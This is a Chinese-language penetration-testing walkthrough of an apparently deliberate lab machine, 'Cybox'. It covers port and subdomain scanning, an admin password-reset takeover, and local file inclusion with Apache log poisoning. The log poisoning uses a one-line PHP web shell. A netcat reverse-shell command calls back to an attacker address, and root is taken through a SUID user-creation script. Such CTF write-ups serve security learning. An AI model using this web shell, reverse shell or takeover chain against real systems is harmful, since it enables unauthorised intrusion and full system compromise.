```
nmap -p- -sV -A 192.168.0.102 
```

奇了个怪，nmap扫不动，是指纹被拦截了吗，上个goby

<img src=".\图片\Snipaste_2022-11-24_19-52-44.png" alt="Snipaste_2022-11-24_19-52-44" style="zoom:80%;" />

好吧，没拦截，nmap这里就是单纯慢

```
PORT    STATE  SERVICE  VERSION
21/tcp  open   ftp      vsftpd 3.0.3
25/tcp  open   smtp     Postfix smtpd
|_smtp-commands: cybox.Home, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
| ssl-cert: Subject: commonName=cybox
| Not valid before: 2020-11-10T23:31:36
|_Not valid after:  2030-11-08T23:31:36
|_ssl-date: TLS randomness does not represent time
53/tcp  closed domain
80/tcp  open   http     Apache httpd 2.2.17 ((Unix) mod_ssl/2.2.17 OpenSSL/0.9.8o DAV/2 PHP/5.2.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.17 (Unix) mod_ssl/2.2.17 OpenSSL/0.9.8o DAV/2 PHP/5.2.15
|_http-title: CYBOX
110/tcp open   pop3     Courier pop3d
|_pop3-capabilities: LOGIN-DELAY(10) UIDL PIPELINING USER TOP IMPLEMENTATION(Courier Mail Server)
143/tcp open   imap     Courier Imapd (released 2011)
|_imap-capabilities: UIDPLUS CHILDREN THREAD=ORDEREDSUBJECT THREAD=REFERENCES SORT completed IDLE QUOTA CAPABILITY OK ACL2=UNIONA0001 ACL NAMESPACE IMAP4rev1
443/tcp open   ssl/http Apache httpd 2.2.17 ((Unix) mod_ssl/2.2.17 OpenSSL/0.9.8o DAV/2 PHP/5.2.15)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.2.17 (Unix) mod_ssl/2.2.17 OpenSSL/0.9.8o DAV/2 PHP/5.2.15
| ssl-cert: Subject: commonName=cybox.company/organizationName=Cybox Company/stateOrProvinceName=New York/countryName=US
| Not valid before: 2020-11-14T15:06:32
|_Not valid after:  2021-11-14T15:06:32
|_ssl-date: 2022-11-24T20:28:06+00:00; +8h00m00s from scanner time.
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
MAC Address: 00:0C:29:9B:9A:18 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.10 - 4.11
Network Distance: 1 hop
Service Info: Host:  cybox.Home; OS: Unix
```

#### 对于80端口：

基本探测和目录扫描

```
└─# gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirb/big.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 
└─# nikto -host 192.168.0.102
```

```
+ Server: Apache/2.2.17 (Unix) mod_ssl/2.2.17 OpenSSL/0.9.8o DAV/2 PHP/5.2.15
+ Server may leak inodes via ETags, header found with file /, inode: 162914, size: 8514, mtime: Sat Aug 29 19:49:26 2020
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.2.17 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ mod_ssl/2.2.17 appears to be outdated (current is at least 2.8.31) (may depend on server version)
+ PHP/5.2.15 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ OpenSSL/0.9.8o appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.
+ mod_ssl/2.2.17 OpenSSL/0.9.8o DAV/2 PHP/5.2.15 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.

/assets               (Status: 301) [Size: 236] [--> http://192.168.0.102/assets/]
/cgi-bin/.html        (Status: 403) [Size: 215]
/cgi-bin/             (Status: 403) [Size: 210]
/cgi-bin/.html.bak    (Status: 403) [Size: 219]
/index.html           (Status: 200) [Size: 8514]
/phpmyadmin           (Status: 403) [Size: 92]

```

phpmyadmin显示：For security reasons, this URL is only accesible using localhost (127.0.0.1) as the hostname

(http://192.168.0.102/assets/)可以看一些前端的目录文件

因为这里的页脚有个域名，试试这一招，改hosts然后子域名爆破

<img src=".\图片\Snipaste_2022-11-24_20-38-44.png" alt="Snipaste_2022-11-24_20-38-44" style="zoom:80%;" />

```
┌──(root💀kali)-[~]
└─# vim /etc/hosts                                                                                            ┌──(root💀kali)-[~]
└─# source /etc/hosts
127.0.0.1: command not found
127.0.1.1: command not found
::1: command not found
ff02::1: command not found
ff02::2: command not found
192.168.0.102: command not found                                                                              ┌──(root💀kali)-[~]
└─# ping cybox.company                                                                                        PING cybox.company (192.168.0.102) 56(84) bytes of data.
64 bytes from cybox.company (192.168.0.102): icmp_seq=1 ttl=64 time=0.957 ms
64 bytes from cybox.company (192.168.0.102): icmp_seq=2 ttl=64 time=1.52 ms
```

可ping通，再子域名爆破，新工具哟

```
┌──(root💀kali)-[~]
└─# wfuzz -H 'HOST: FUZZ.cybox.company' -u 'http://192.168.0.102' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hw 489,27
```

```
000000065:   200        73 L     132 W      1252 Ch     "register - register"                          
000000509:   200        67 L     515 W      5295 Ch     "ftp - ftp"                                    
000000834:   200        10 L     22 W       209 Ch      "dev - dev"                                    
000001543:   302        0 L      0 W        0 Ch        "webmail - webmail"                            
000001614:   302        0 L      0 W        0 Ch        "monitor - monitor"                           
```

把域名子域名加入hosts再访问，发现一系列注册登录，想到任意密码修改越权之类的测试

<img src=".\图片\Snipaste_2022-11-26_17-48-05.png" alt="Snipaste_2022-11-26_17-48-05" style="zoom:80%;" />

点击忘记密码时显示了连接，直接换参数admin

<img src=".\图片\Snipaste_2022-11-26_17-54-37.png" alt="Snipaste_2022-11-26_17-54-37" style="zoom:80%;" />

成功修改 admin@cybox.company 的密码，进入后台，再观察功能点，可是发现啥也没有

<img src=".\图片\Snipaste_2022-11-26_17-56-06.png" alt="Snipaste_2022-11-26_17-56-06" style="zoom:80%;" />

在加载Admin panel 后台时发现加载了一个url，可能是文件读取文件包含之类的，直接换参数

http://monitor.cybox.company/admin/styles.php?style=general

<img src=".\图片\Snipaste_2022-11-26_17-59-18.png" alt="Snipaste_2022-11-26_17-59-18" style="zoom:80%;" />

顺便提一下，有phpinfo.php，没记错的话此版本有00截断

<img src=".\图片\Snipaste_2022-11-26_18-03-28.png" alt="Snipaste_2022-11-26_18-03-28" style="zoom:80%;" />

包含日志，在UA头里写shell，ctf题里的套路

<img src=".\图片\Snipaste_2022-11-26_18-13-42.png" alt="Snipaste_2022-11-26_18-13-42" style="zoom:80%;" />

执行反弹shell命令，python交互

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.103 443 >/tmp/f
python -c 'import pty; pty.spawn("/bin/bash")'
```

#### 提权：

发现这里有我们创建的zfy

```
daemon@cybox:/home$ ls -al
ls -al
total 20
drwxr-xr-x  5 root  root  4096 Nov 26 18:47 .
drwxr-xr-x 22 root  root  4096 Nov 11  2020 ..
drwxr-xr-x  3 admin admin 4096 Nov 15  2020 admin
drwxr-xr-x  4 cybox cybox 4096 Nov 21  2020 cybox
drwxr-xr-x  3 zfy   zfy   4096 Nov 26 18:47 zfy
```

找root权限执行的文件

```
find / ‐perm ‐u=s ‐type f 2>/dev/null
```

```
$ cat /opt/register
#!/bin/bash

USERNAME=$1

if [ ! "$USERNAME" ]
then
    /bin/echo -e "Syntax: Username"
    exit 1
fi

if [[ "$USERNAME" =~ [^a-z] ]]; then
   /bin/echo -e "Think twice before putting something :)"
   exit 0
fi

if /usr/bin/id "$USERNAME" >/dev/null 2>&1; then
    /bin/echo -e "User already exists :("
    exit 0
fi

if [ ! "$(/bin/cat /etc/group | /bin/grep -w "$USERNAME")" ]
then
    /usr/sbin/groupadd "$USERNAME" 2>/dev/null
fi

/usr/sbin/useradd -p "$(/usr/bin/openssl passwd -1 "$USERNAME")" -m "$USERNAME" -g "$USERNAME" -s /bin/bash 2>/dev/null

/usr/bin/maildirmake /home/"$USERNAME"/Maildir/ -R 2>/dev/null

/bin/chown "$USERNAME":"$USERNAME" /home/"$USERNAME"/Maildir/ -R 2>/dev/null

if [ $? -eq 0 ]; then
    /bin/echo -e "$USERNAME@cybox.company has been created successfully. The credentials are $USERNAME:$USERNAME. You should change your default password for security."
else
    /bin/echo -e "The string must contain a maximum of 32 characters."
```

这是个创建用户的脚本，直接创建sudo用户，发现它在sudo组里

```
daemon@cybox:/opt$ /registerlauncher sudo
/registerlauncher sudo
bash: /registerlauncher: No such file or directory
daemon@cybox:/opt$ ./registerlauncher sudo
./registerlauncher sudo
sudo@cybox.company has been created successfully. The credentials are sudo:sudo. You should change your default password for security.
daemon@cybox:/opt$ cd /home
cd /home
daemon@cybox:/home$ ls
ls
admin  cybox  sudo  zfy
```

切换到sudo用户，密码也为sudo

```
daemon@cybox:/home$ su sudo
su sudo
Password: sudo

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

sudo@cybox:/home$
```

发现sudo可以执行任何命令，直接bash

```
sudo@cybox:/home$ sudo -l
sudo -l
[sudo] password for sudo: sudo

Matching Defaults entries for sudo on cybox:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sudo may run the following commands on cybox:
    (ALL : ALL) ALL
sudo@cybox:/home$ sudo bash
sudo bash
root@cybox:/home#
```

<img src=".\图片\Snipaste_2022-11-26_19-05-50.png" alt="Snipaste_2022-11-26_19-05-50"  />

#### 总结：

发现域名，爆破子域名加入hosts，发现更多信息

注册登录修改密码功能，实现越权，替换修改密码链接中重要信息，修改admin@cybox.company的密码

关键url  http://monitor.cybox.company/admin/styles.php?style=general  发现文件包含，直接包含apache日志写shell反弹shell `<?php system($_GET[a]); ?>`

提权时发现一个suid文件是创建用户的脚本，于是创建sudo用户，发现其sudo -l可以执行任意命令。于是执行bash成功提权到root





